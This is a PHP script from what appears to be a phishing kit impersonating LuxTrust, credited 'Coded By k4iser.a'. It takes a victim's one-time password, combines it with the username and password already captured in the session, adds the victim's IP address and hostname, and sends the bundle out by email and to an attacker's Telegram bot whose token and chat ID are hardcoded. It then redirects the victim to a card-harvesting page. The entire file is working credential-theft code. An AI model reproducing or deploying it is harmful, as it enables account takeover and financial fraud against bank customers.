<?php
session_start();


$otp=$_POST["otp"];

$rand=rand(1000000,999999999).rand(1000000,999999999);
$rand2=base64_encode($rand);
	

        $_SESSION['otp'] = $otp;

        



$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "~ Coded By k4iser.a  ~\n";
$message .= "|----------|USER LUXTRUST |----------|\n";
$message .= "Username  : ".$_SESSION['user']."\n";
$message .= "PWD  : ".$_SESSION['pass']."\n";
$message .= "|----------|OTP 1 LUXTRUST |----------|\n";
$message .= "OTP   : ".$_SESSION['otp']."\n";
$message .= "|------------------+|IP|-------------------|\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "Hostname  : ".$hostname."\n";

$subject = "~ <Rslt- LUXTRUST>- Coded By k4iser.a ~ | $ip";

mail($email, $subject, $message);

$token = "6652236352:AAGhXniKLOm21W8sdQynNoSj5nE34yMEPhQ";
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=6413015802&text=" . urlencode($message)."" );
header("location:card.php?vc?__event=card&service_id=top_card=PT")
?>